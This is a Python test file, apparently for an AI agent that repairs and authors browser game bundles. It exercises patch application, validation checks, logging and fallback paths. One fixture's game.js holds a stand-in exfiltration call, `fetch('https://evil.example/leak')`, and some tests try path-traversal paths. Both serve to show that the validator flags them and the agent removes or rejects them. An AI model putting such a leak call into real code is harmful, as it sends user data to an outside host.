"""repair 内层 agent：会话工具语义 + 节点接线/回退（全部离线，不触网不依赖 SDK）。"""
import time
import sys
from types import ModuleType, SimpleNamespace

import pytest

from app.agents import code_agent, nodes


def _files():
    return [
        {
            "path": "index.html",
            "content": '<html><head></head><body><canvas id="stage"></canvas><script src="game.js"></script></body></html>',
        },
        {"path": "style.css", "content": "canvas{display:block}"},
        {"path": "game.js", "content": "var score = 0; fetch('https://evil.example/leak');"},
    ]


def _patch(old: str, new: str, path: str = "game.js") -> str:
    return (
        "*** Begin Patch\n"
        f"*** Update File: {path}\n"
        f"-{old}\n"
        f"+{new}\n"
        "*** End Patch"
    )


def _outcome(**overrides):
    base = dict(
        files=_files(),
        changed=["game.js"],
        tokens=321,
        logs=["agent patched game.js (1 chunk(s), 24B)"],
        note="FIXED: removed fetch call",
        checks_ok=True,
        turns=3,
    )
    base.update(overrides)
    return code_agent.RepairOutcome(**base)


# ---- RepairSession 工具面 ----

def test_session_read_patch_checks_roundtrip():
    s = code_agent.RepairSession.from_files(_files())
    assert "fetch" in s.read_file("game.js")
    report = s.run_checks()
    assert "CHECKS FAILED" in report and "fetch()" in report
    assert not s.checks_ok

    out = s.apply_patch(
        "```patch\n"
        + _patch(
            "var score = 0; fetch('https://evil.example/leak');",
            "var score = 0; function tick() { score += 1; }",
        )
        + "\n```",
    )
    assert "run_checks" in out
    assert s.changed == {"game.js"}
    report = s.run_checks()
    assert "ALL CHECKS PASSED" in report
    assert s.checks_ok

    files = s.to_files()
    assert [f["path"] for f in files] == ["index.html", "style.css", "game.js"]
    assert "fetch" not in files[2]["content"]


def test_session_logs_to_live_step(monkeypatch):
    calls = []
    monkeypatch.setattr(
        code_agent.tracing,
        "record_step_log",
        lambda line, *, step_id=None, payload=None: calls.append((line, step_id, payload)) or True,
    )
    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")

    s.read_file("game.js")

    assert s.log_lines[0].startswith("agent read game.js")
    assert calls[0][0] == s.log_lines[0]
    assert calls[0][1] == "step-1"
    assert calls[0][2]["type"] == "tool"
    assert calls[0][2]["tool"] == "read_file"
    assert calls[0][2]["path"] == "game.js"
    assert calls[0][2]["status"] == "done"
    assert isinstance(calls[0][2]["bytes"], int)


def test_session_edit_logs_include_line_delta(monkeypatch):
    calls = []
    monkeypatch.setattr(
        code_agent.tracing,
        "record_step_log",
        lambda line, *, step_id=None, payload=None: calls.append((line, payload)) or True,
    )
    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")

    s.apply_patch(
        "*** Begin Patch\n"
        "*** Update File: game.js\n"
        "-var score = 0; fetch('https://evil.example/leak');\n"
        "+var ok = 1;\n"
        "+var score = 0;\n"
        "*** End Patch"
    )

    assert any(line.startswith("agent patched game.js (+2 -1,") for line, _payload in calls)
    assert any(
        payload
        and payload.get("type") == "file_change"
        and payload.get("path") == "game.js"
        and payload.get("added") == 2
        and payload.get("deleted") == 1
        and payload.get("cline_tool") == "editedExistingFile"
        and payload.get("diff_format") == "unified"
        and "files_in_context" in payload
        for _line, payload in calls
    )


def test_session_lists_and_searches_bundle_with_structured_events(monkeypatch):
    calls = []
    monkeypatch.setattr(
        code_agent.tracing,
        "record_step_log",
        lambda line, *, step_id=None, payload=None: calls.append((line, payload)) or True,
    )
    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")

    listed = s.list_files()
    found = s.search_files("score", "*.js")

    assert "game.js" in listed and "script order: game.js" in listed
    assert "game.js:1:" in found
    assert any(payload and payload.get("cline_tool") == "listFilesTopLevel" for _line, payload in calls)
    search_payload = next(payload for _line, payload in calls if payload and payload.get("tool") == "search_files")
    assert search_payload["cline_tool"] == "searchFiles"
    assert search_payload["matches"][0]["path"] == "game.js"


def test_agent_heartbeat_logs_bundle_activity(monkeypatch):
    monkeypatch.setattr(code_agent.tracing, "record_step_log", lambda line, *, step_id=None, payload=None: True)
    s = code_agent.RepairSession.from_files(_files(), live_step_id="step-1")

    stop, thread = code_agent._start_heartbeat(s, agent_name="GameCodeAuthor", interval=0.01)
    try:
        for _ in range(30):
            if s.log_lines:
                break
            time.sleep(0.01)
    finally:
        code_agent._stop_heartbeat(stop, thread)

    assert any("agent authoring waiting on model response:" in line for line in s.log_lines)
    assert any("since last tool" in line for line in s.log_lines)
    assert any("bundle=3 file(s)" in line for line in s.log_lines)


def test_session_patch_resets_checks_flag():
    s = code_agent.RepairSession.from_files(_files())
    s.apply_patch(_patch("var score = 0; fetch('https://evil.example/leak');", "var ok = 1;"))
    s.run_checks()
    assert s.checks_ok
    s.apply_patch(_patch("var ok = 1;", "var broken = ;"))
    assert not s.checks_ok  # 新编辑未复检前不可视为通过


def test_session_rejects_unknown_path_and_oversize():
    s = code_agent.RepairSession.from_files(_files())
    assert "no such file" in s.apply_patch(_patch("x", "y", path="evil.js"))
    assert "no such file" in s.read_file("nope.js")
    big = "x" * (code_agent.validation.MAX_FILE_BYTES + 1)
    assert "exceeds" in s.apply_patch(
        _patch("var score = 0; fetch('https://evil.example/leak');", big)
    )
    assert s.changed == set()


def test_session_rejects_invalid_patch_inputs():
    s = code_agent.RepairSession.from_files(_files())
    # 非补丁文本：错误消息直接教 V4A 格式
    assert "Begin Patch" in s.apply_patch("replace everything")
    # 旧 unified diff：明确指路换格式
    unified = "--- a/game.js\n+++ b/game.js\n@@ -1 +1 @@\n-a\n+b"
    assert "unified diff" in s.apply_patch(unified)
    # 上下文与当前文件不符
    assert "context not found" in s.apply_patch(_patch("var missing = true;", "var ok = true;"))
    # Move 不支持；Add/Delete 的新契约见 test_session_add_delete_files
    move = "*** Begin Patch\n*** Move to: main.js\n*** End Patch"
    assert "not supported" in s.apply_patch(move)
    # 截断的补丁（缺 *** End Patch）要求重发而不是半套用
    truncated = (
        "*** Begin Patch\n*** Update File: game.js\n"
        "-var score = 0; fetch('https://evil.example/leak');\n+var ok = 1;"
    )
    assert "End Patch" in s.apply_patch(truncated)
    assert s.changed == set()


def test_session_multifile_patch_is_atomic():
    s = code_agent.RepairSession.from_files(_files())
    patch = (
        "*** Begin Patch\n"
        "*** Update File: game.js\n"
        "-var score = 0; fetch('https://evil.example/leak');\n"
        "+var score = 0;\n"
        "*** Update File: style.css\n"
        "-canvas{display:block}\n"
        "+canvas{display:block;background:#000}\n"
        "*** End Patch"
    )
    out = s.apply_patch(patch)
    assert "game.js" in out and "style.css" in out
    assert s.changed == {"game.js", "style.css"}
    # 任一文件失败则整个补丁不落盘
    s2 = code_agent.RepairSession.from_files(_files())
    bad = patch.replace("-canvas{display:block}", "-canvas{display:none}")
    assert "context not found" in s2.apply_patch(bad)
    assert s2.changed == set() and "fetch" in s2.read_file("game.js")


def test_session_applies_anchored_section_patch():
    files = _files()
    files[2]["content"] = (
        "function setup() {\n  var a = 1;\n}\n"
        "function update() {\n  var a = 1;\n}\n"
    )
    s = code_agent.RepairSession.from_files(files)
    patch = (
        "*** Begin Patch\n"
        "*** Update File: game.js\n"
        "@@ function update() {\n"
        "-  var a = 1;\n"
        "+  var a = 2;\n"
        "*** End Patch"
    )
    assert "run_checks" in s.apply_patch(patch)
    body = s.read_file("game.js")
    # @@ 锚点必须命中第二处同名行，setup 里的保持不动
    assert "function setup() {\n  var a = 1;\n}" in body
    assert "function update() {\n  var a = 2;\n}" in body


def test_session_accepts_missing_begin_sentinel():
    s = code_agent.RepairSession.from_files(_files())
    patch = (
        "*** Update File: game.js\n"
        "-var score = 0; fetch('https://evil.example/leak');\n"
        "+var ok = 1;\n"
        "*** End Patch"
    )
    assert "run_checks" in s.apply_patch(patch)


def test_session_rejects_noop_patch():
    s = code_agent.RepairSession.from_files(_files())
    line = "var score = 0; fetch('https://evil.example/leak');"
    assert "no changes" in s.apply_patch(_patch(line, line))
    assert s.changed == set()


def test_session_preserves_crlf():
    files = _files()
    files[2]["content"] = "var a = 1;\r\nvar b = 2;\r\n"
    s = code_agent.RepairSession.from_files(files)
    patch = "*** Begin Patch\n*** Update File: game.js\n-var b = 2;\n+var b = 3;\n*** End Patch"
    assert "run_checks" in s.apply_patch(patch)
    assert s.contents["game.js"] == "var a = 1;\r\nvar b = 3;\r\n"


def test_skills_expose_runtime_contract():
    s = code_agent.RepairSession.from_files(_files())
    assert "gameweave-runtime" in s.list_skills()
    body = s.read_skill("gameweave-runtime")
    assert "postMessage" in body and "400KB" in body
    assert "unknown skill" in s.read_skill("nope")
    assert "unknown skill" in s.read_skill("../secrets")  # 路径穿越拒绝


def test_enabled_requires_flag_and_real_model(monkeypatch):
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_ENABLED", False)
    assert not code_agent.enabled({"use_real": True})
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_ENABLED", True)
    assert code_agent.enabled({"use_real": True})
    assert not code_agent.enabled({"use_real": False})
    assert not code_agent.enabled({})


# ---- 节点接线：agent 成功 / 不收敛回退 / 不可用回退 ----

def test_repair_node_uses_agent_outcome(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome())
    out = nodes.repair_code_node(
        {
            "repair_attempts": 0,
            "last_error": "forbidden API in game.js: fetch()",
            "generated_files": _files(),
            "use_real": True,
            "dimension": "2d",
        }
    )
    assert out["repair_attempts"] == 1
    assert out["_tokens_delta"] == 321
    assert out["_agent"] == "GameCodeAgentRepair"
    assert any("agent tool loop" in line for line in out["_logs"])
    assert any("agent self-checks passed" in line for line in out["_logs"])


def test_repair_node_falls_back_when_agent_unavailable(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: None)
    seen = {}

    def fake_generate(state, repair_error=None):
        seen["error"] = repair_error
        return _files(), 7, "template", []

    monkeypatch.setattr(nodes, "_generate_code", fake_generate)
    out = nodes.repair_code_node(
        {"repair_attempts": 1, "last_error": "boom", "generated_files": _files(), "use_real": True}
    )
    assert seen["error"] == "boom"
    assert out["repair_attempts"] == 2
    assert out["_tokens_delta"] == 7
    assert any("falling back to full regeneration" in line for line in out["_logs"])


def test_repair_node_fallback_keeps_agent_tokens(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(
        code_agent, "run_repair", lambda files, **kw: _outcome(checks_ok=False, note="GIVEUP: cannot fix")
    )
    monkeypatch.setattr(nodes, "_generate_code", lambda state, repair_error=None: (_files(), 10, "template", []))
    out = nodes.repair_code_node(
        {"repair_attempts": 0, "last_error": "boom", "generated_files": _files(), "use_real": True}
    )
    # agent 花掉的 tokens 也要并入步骤增量，与 LLMCall 记账口径一致
    assert out["_tokens_delta"] == 331
    assert any("did not converge" in line for line in out["_logs"])


def test_repair_node_legacy_path_when_disabled(monkeypatch):
    monkeypatch.setattr(nodes, "_generate_code", lambda state, repair_error=None: (_files(), 5, "template", []))
    called = {"agent": False}
    monkeypatch.setattr(code_agent, "run_repair", lambda *a, **kw: called.__setitem__("agent", True))
    out = nodes.repair_code_node({"repair_attempts": 0, "last_error": "x", "generated_files": _files()})
    assert not called["agent"]  # 默认关闭：完全不进 agent 路径
    assert out["_tokens_delta"] == 5


def test_revision_repair_node_agent_path_requires_changes(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome(changed=[]))
    monkeypatch.setattr(
        nodes, "_generate_revision_code", lambda state, repair_error=None: (_files(), 4, ["game.js"], "model")
    )
    out = nodes.revision_repair_node(
        {
            "repair_attempts": 0,
            "last_error": "revision produced no file changes",
            "generated_files": _files(),
            "use_real": True,
            "task_kind": "revision",
            "base_version": "v2",
        }
    )
    # 空编辑不满足 revision 门禁 → 回落单次修订，但 agent tokens 保留
    assert out["_tokens_delta"] == 4 + 321
    assert out["revision_result"]["changed_files"] == ["game.js"]


def test_revision_repair_node_uses_agent_outcome(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome())
    out = nodes.revision_repair_node(
        {
            "repair_attempts": 0,
            "last_error": "forbidden API in game.js: fetch()",
            "generated_files": _files(),
            "use_real": True,
            "task_kind": "remix",
            "base_version": "v3",
        }
    )
    assert out["repair_attempts"] == 1
    assert out["revision_result"] == {"changed_files": ["game.js"], "base_version": "v3"}
    assert out["_tokens_delta"] == 321
    assert out["validation_result"] == {} and out["gameplay_qa_result"] == {}


def test_run_repair_returns_none_for_empty_bundle():
    assert code_agent.run_repair([], error="whatever") is None


def test_build_input_labels_failure_source():
    default = code_agent._build_input(_files(), "boom", "2d", None)
    assert default.startswith("Build validation failed with:")
    qa = code_agent._build_input(_files(), "boom", "2d", None, failure_label="Browser gameplay QA")
    assert qa.startswith("Browser gameplay QA failed with:")


# ---- gameplay repair：运行时报错走最小 patch，玩法指标仍整包重生成 ----

def _qa_result(issues):
    return {"passed": False, "issues": issues, "warnings": [], "metrics": {}}


def test_classify_gameplay_failure_runtime_vs_design():
    runtime = ["browser page error: TypeError: this.enemies.children.iterate is not a function"]
    kind, picked = nodes._classify_gameplay_failure(_qa_result(runtime))
    assert kind == "runtime" and picked == runtime
    # 崩溃伴随的零帧/超时是症状，不改变运行时判定
    kind, picked = nodes._classify_gameplay_failure(
        _qa_result(runtime + ["browser sandbox observed no game-loop activity"])
    )
    assert kind == "runtime" and picked == runtime
    # 混入玩法指标问题 → 必须整包重生成
    assert nodes._classify_gameplay_failure(_qa_result(runtime + ["no input handling found"]))[0] == "design"
    assert nodes._classify_gameplay_failure(_qa_result(["no input handling found"])) == ("design", [])
    # 只有症状没有报错，patch 无从下手
    assert nodes._classify_gameplay_failure(_qa_result(["browser sandbox observed no game-loop activity"]))[0] == "design"
    assert nodes._classify_gameplay_failure({})[0] == "design"


def test_gameplay_repair_patches_runtime_error(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    seen = {}

    def fake_repair(files, **kw):
        seen.update(kw)
        return _outcome()

    monkeypatch.setattr(code_agent, "run_repair", fake_repair)
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "dimension": "2d",
            "balance_config": {"target_score": 100},
            "gameplay_qa_result": _qa_result(
                ["browser page error: TypeError: this.enemies.children.iterate is not a function"]
            ),
        }
    )
    assert seen["failure_label"] == "Browser gameplay QA"
    assert "children.iterate" in seen["error"]
    assert out["gameplay_repair_attempts"] == 1
    assert out["generated_files"] == _files()
    assert out["_tokens_delta"] == 321
    assert out["validation_result"] == {} and out["gameplay_qa_result"] == {}
    # patch 不动设计与难度
    assert "balance_config" not in out and "game_design" not in out
    # patch 产物回外层门禁复检，而不是重新生成
    assert nodes.next_after_gameplay_repair(out) == "build_validation"


def test_gameplay_repair_empty_edit_falls_back_to_regeneration(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    monkeypatch.setattr(code_agent, "run_repair", lambda files, **kw: _outcome(changed=[]))
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "gameplay_qa_result": _qa_result(["browser console error: boom"]),
        }
    )
    # 浏览器 bug 在 run_checks 里不复现，空编辑等于没修 → 回落整包重生成
    assert out["generated_files"] == []
    assert out["balance_config"]["repair_attempt"] == 1
    assert out["_tokens_delta"] == 321  # agent 花掉的 tokens 仍记账
    assert nodes.next_after_gameplay_repair(out) == "code_generation"


def test_gameplay_repair_design_issue_skips_agent(monkeypatch):
    monkeypatch.setattr(code_agent, "enabled", lambda state: True)
    called = {"agent": False}
    monkeypatch.setattr(code_agent, "run_repair", lambda *a, **kw: called.__setitem__("agent", True))
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 0,
            "generated_files": _files(),
            "use_real": True,
            "gameplay_qa_result": _qa_result(["no input handling found"]),
        }
    )
    assert not called["agent"]  # 玩法指标问题不进 patch 路径
    assert out["generated_files"] == []
    assert out["balance_config"] and out["game_design"]
    assert out["_tokens_delta"] == 0


def test_gameplay_repair_legacy_path_when_disabled(monkeypatch):
    called = {"agent": False}
    monkeypatch.setattr(code_agent, "run_repair", lambda *a, **kw: called.__setitem__("agent", True))
    out = nodes.gameplay_repair_node(
        {
            "gameplay_repair_attempts": 1,
            "generated_files": _files(),
            "gameplay_qa_result": _qa_result(["browser page error: TypeError: boom"]),
        }
    )
    assert not called["agent"]  # 默认关闭：运行时报错也走旧的重生成路径
    assert out["generated_files"] == []
    assert out["gameplay_repair_attempts"] == 2
    # 开关没开导致的回落必须留痕，不能静默
    assert any("code agent disabled" in line for line in out["_logs"])


# ---- 作者模式：Add/Delete/write_file 与多文件 bundle 的契约 ----


def test_session_add_delete_files():
    s = code_agent.RepairSession.from_files(_files())
    add = (
        "*** Begin Patch\n"
        "*** Add File: shop.js\n"
        "+var shopOpen = false;\n"
        "+function toggleShop(){ shopOpen = !shopOpen; }\n"
        "*** End Patch"
    )
    out = s.apply_patch(add)
    assert "added shop.js" in out
    assert s.read_file("shop.js").startswith("var shopOpen")
    assert "shop.js" in s.changed and s.order[-1] == "shop.js"
    # 平铺路径 + 扩展名白名单：路径穿越与额外 html 都拒绝
    assert "invalid new file path" in s.apply_patch(
        "*** Begin Patch\n*** Add File: ../evil.js\n+var x = 1;\n*** End Patch"
    )
    assert "invalid new file path" in s.apply_patch(
        "*** Begin Patch\n*** Add File: page.html\n+<html></html>\n*** End Patch"
    )
    # 已存在的文件必须走 Update
    assert "already exists" in s.apply_patch(
        "*** Begin Patch\n*** Add File: shop.js\n+var x = 1;\n*** End Patch"
    )
    # 三件套不可删；模块可删
    assert "cannot delete" in s.apply_patch("*** Begin Patch\n*** Delete File: game.js\n*** End Patch")
    assert "deleted shop.js" in s.apply_patch("*** Begin Patch\n*** Delete File: shop.js\n*** End Patch")
    assert "shop.js" not in s.order


def test_session_add_respects_file_count_cap(monkeypatch):
    monkeypatch.setattr(code_agent.validation, "MAX_BUNDLE_FILES", 4)
    s = code_agent.RepairSession.from_files(_files())
    assert "added a.js" in s.apply_patch("*** Begin Patch\n*** Add File: a.js\n+var a = 1;\n*** End Patch")
    assert "max 4" in s.apply_patch("*** Begin Patch\n*** Add File: b.js\n+var b = 1;\n*** End Patch")


def test_session_write_file_creates_and_replaces():
    s = code_agent.RepairSession.from_files(_files())
    out = s.write_file("hud.js", "var hud = 1;")
    assert "wrote hud.js" in out and "Wire it into index.html" in out
    assert s.order[-1] == "hud.js" and "hud.js" in s.changed
    # 整文件替换已有文件（作者模式写 game.js 核心用）
    assert "wrote game.js" in s.write_file("game.js", "var score = 1;")
    assert s.read_file("game.js") == "var score = 1;"
    # 路径与体积约束
    assert "invalid new file path" in s.write_file("../x.js", "var x = 1;")
    assert "invalid new file path" in s.write_file("sub/dir.js", "var x = 1;")
    big = "x" * (code_agent.validation.MAX_FILE_BYTES + 1)
    assert "over the" in s.write_file("big.js", big)


def test_run_checks_accepts_referenced_module_bundle():
    files = [
        {
            "path": "index.html",
            "content": '<html><head></head><body><canvas id="stage"></canvas>'
            '<script src="helpers.js"></script><script src="game.js"></script></body></html>',
        },
        {"path": "style.css", "content": "canvas{display:block}"},
        {"path": "helpers.js", "content": "var HELPER = { boost: 2 };"},
        {"path": "game.js", "content": "var score = HELPER.boost;"},
    ]
    s = code_agent.RepairSession.from_files(files)
    assert "ALL CHECKS PASSED" in s.run_checks()


def test_run_checks_flags_unreferenced_module():
    files = _files() + [{"path": "shop.js", "content": "var shop = 1;"}]
    s = code_agent.RepairSession.from_files(files)
    # _files() 的 game.js 带 fetch()，先修掉再看引用错误更聚焦——直接断言引用错误在输出里即可
    out = s.run_checks()
    assert "shop.js is not referenced" in out


def test_author_enabled_requires_flag_and_real_model(monkeypatch):
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_AUTHOR_ENABLED", True)
    assert code_agent.author_enabled({"use_real": True})
    assert not code_agent.author_enabled({"use_real": False})
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_AUTHOR_ENABLED", False)
    assert not code_agent.author_enabled({"use_real": True})


def test_run_author_returns_none_for_empty_bundle():
    assert code_agent.run_author([], spec={}, design={}) is None


def test_execute_agent_uses_responses_model(monkeypatch):
    agents_module = ModuleType("agents")
    exceptions_module = ModuleType("agents.exceptions")
    captured = {}

    class FakeAgent:
        def __init__(self, **kwargs):
            captured["agent"] = kwargs

    class FakeResponsesModel:
        def __init__(self, *, model, openai_client):
            captured["model"] = model
            captured["client"] = openai_client

    class FakeRunConfig:
        def __init__(self, **kwargs):
            captured["run_config"] = kwargs

    class FakeRunner:
        @staticmethod
        def run_sync(agent, task_input, *, max_turns, run_config):
            captured["run"] = {
                "agent": agent,
                "task_input": task_input,
                "max_turns": max_turns,
                "run_config": run_config,
            }
            usage = SimpleNamespace(
                requests=1,
                input_tokens=11,
                output_tokens=7,
                total_tokens=18,
                input_tokens_details=SimpleNamespace(cached_tokens=0),
            )
            return SimpleNamespace(final_output="FIXED: ok", context_wrapper=SimpleNamespace(usage=usage))

    def fake_function_tool(fn):
        return fn

    agents_module.Agent = FakeAgent
    agents_module.OpenAIResponsesModel = FakeResponsesModel
    agents_module.RunConfig = FakeRunConfig
    agents_module.Runner = FakeRunner
    agents_module.function_tool = fake_function_tool
    exceptions_module.AgentsException = RuntimeError
    exceptions_module.MaxTurnsExceeded = TimeoutError

    openai_module = ModuleType("openai")

    class FakeAsyncOpenAI:
        def __init__(self, **kwargs):
            captured["client_kwargs"] = kwargs

        async def close(self):
            captured["closed"] = True

    openai_module.AsyncOpenAI = FakeAsyncOpenAI
    monkeypatch.setitem(sys.modules, "agents", agents_module)
    monkeypatch.setitem(sys.modules, "agents.exceptions", exceptions_module)
    monkeypatch.setitem(sys.modules, "openai", openai_module)
    monkeypatch.setattr(code_agent, "available_skills", lambda: [])
    monkeypatch.setattr(code_agent.llm, "record_usage", lambda *args, **kwargs: None)

    session = code_agent.RepairSession.from_files(_files())
    outcome = code_agent._execute_agent(
        session,
        agent_name="GameCodeRepair",
        instructions="repair",
        author_tools=False,
        task_input="input",
        turns_limit=5,
        workflow_name="test-workflow",
    )

    expected_model = code_agent.settings.CODE_AGENT_MODEL or code_agent.settings.MODEL_NAME
    assert outcome is not None
    assert captured["model"] == expected_model
    assert captured["agent"]["model"].__class__ is FakeResponsesModel
    assert captured["run"]["max_turns"] == 5
    assert captured["run_config"] == {"workflow_name": "test-workflow", "tracing_disabled": True}
    assert captured["client_kwargs"]["base_url"] == code_agent.settings.OPENAI_BASE_URL
    assert captured["closed"] is True


def test_author_input_carries_spec_design_and_runtime():
    files = [{"path": "index.html", "content": "<html></html>"}]
    text = code_agent._build_author_input(files, {"title": "T"}, {"mode": "waves"}, "phaser", "2d")
    assert '"title": "T"' in text and '"mode": "waves"' in text
    assert "Phaser" in text and "index.html (13B)" in text


def test_generate_code_uses_author_agent(monkeypatch):
    monkeypatch.setattr(nodes.templating, "select_template", lambda spec, design: "t")
    monkeypatch.setattr(nodes.templating, "build_config", lambda *a, **kw: {"title": "T"})
    monkeypatch.setattr(nodes.templating, "render_files", lambda *a, **kw: [])
    monkeypatch.setattr(nodes.code_agent, "author_enabled", lambda state: True)
    outcome = code_agent.RepairOutcome(
        files=[
            {"path": "index.html", "content": '<script src="game.js"></script><script src="shop.js"></script>'},
            {"path": "style.css", "content": "canvas{}"},
            {"path": "game.js", "content": "var score = 0;" * 40},
            {"path": "shop.js", "content": "var shop = [];"},
        ],
        changed=["game.js", "shop.js"],
        tokens=99,
        logs=["agent wrote game.js (560B, new file)"],
        note="DONE: core + shop",
        checks_ok=True,
        turns=6,
    )
    monkeypatch.setattr(nodes.code_agent, "run_author", lambda files, **kw: outcome)
    files, tokens, mode, agent_logs = nodes._generate_code({"use_real": True, "game_spec": {}, "game_design": {}})
    assert tokens == 99
    assert mode.startswith("agent author (4 file(s), 6 turn(s)")
    assert any(f["path"] == "shop.js" for f in files)
    assert any("agent wrote game.js" in line for line in agent_logs)


def test_generate_code_author_failure_stops_when_fallback_disabled(monkeypatch):
    monkeypatch.setattr(nodes.settings, "REAL_MODEL_FALLBACK_ENABLED", False)
    monkeypatch.setattr(nodes.settings, "PHASER_2D_ENABLED", False)
    monkeypatch.setattr(nodes.templating, "select_template", lambda spec, design: "t")
    monkeypatch.setattr(nodes.templating, "build_config", lambda *a, **kw: {"title": "T"})
    monkeypatch.setattr(nodes.templating, "render_files", lambda *a, **kw: [])
    monkeypatch.setattr(nodes.code_agent, "author_enabled", lambda state: True)
    monkeypatch.setattr(nodes.code_agent, "run_author", lambda files, **kw: None)

    def fail_chat(*args, **kwargs):
        raise AssertionError("one-shot fallback should not run")

    monkeypatch.setattr(nodes.llm, "chat", fail_chat)

    with pytest.raises(RuntimeError, match="GameCodeAuthor real model failed; fallback disabled"):
        nodes._generate_code({"use_real": True, "game_spec": {}, "game_design": {}})


def test_generate_code_author_can_fall_back_when_enabled(monkeypatch):
    monkeypatch.setattr(nodes.settings, "REAL_MODEL_FALLBACK_ENABLED", True)
    monkeypatch.setattr(nodes.settings, "PHASER_2D_ENABLED", False)
    monkeypatch.setattr(nodes.templating, "select_template", lambda spec, design: "t")
    monkeypatch.setattr(nodes.templating, "build_config", lambda *a, **kw: {"title": "T"})
    monkeypatch.setattr(nodes.templating, "render_files", lambda *a, **kw: [])
    monkeypatch.setattr(nodes.code_agent, "author_enabled", lambda state: True)
    monkeypatch.setattr(nodes.code_agent, "run_author", lambda files, **kw: None)
    monkeypatch.setattr(
        nodes.llm,
        "chat",
        lambda *a, **kw: ("```html\n\n```\n```css\nc{}\n```\n```js\n" + "var x=1;" * 80 + "\n```", 7),
    )
    files, tokens, mode, agent_logs = nodes._generate_code({"use_real": True, "game_spec": {}, "game_design": {}})
    assert mode.startswith("model (")
    assert any("falling back to one-shot" in line for line in agent_logs)


def test_generate_code_repair_path_skips_author(monkeypatch):
    monkeypatch.setattr(nodes.settings, "PHASER_2D_ENABLED", False)
    monkeypatch.setattr(nodes.templating, "select_template", lambda spec, design: "t")
    monkeypatch.setattr(nodes.templating, "build_config", lambda *a, **kw: {"title": "T"})
    monkeypatch.setattr(nodes.templating, "render_files", lambda *a, **kw: [])
    monkeypatch.setattr(nodes.code_agent, "author_enabled", lambda state: True)
    called = {"author": False}
    monkeypatch.setattr(
        nodes.code_agent, "run_author", lambda files, **kw: called.__setitem__("author", True)
    )
    monkeypatch.setattr(
        nodes.llm,
        "chat",
        lambda *a, **kw: ("```html\n\n```\n```css\nc{}\n```\n```js\n" + "var x=1;" * 80 + "\n```", 7),
    )
    files, tokens, mode, agent_logs = nodes._generate_code(
        {"use_real": True, "game_spec": {}, "game_design": {}}, repair_error="boom"
    )
    assert not called["author"]  # 修复重生成不重跑作者循环
    assert mode.startswith("model (")
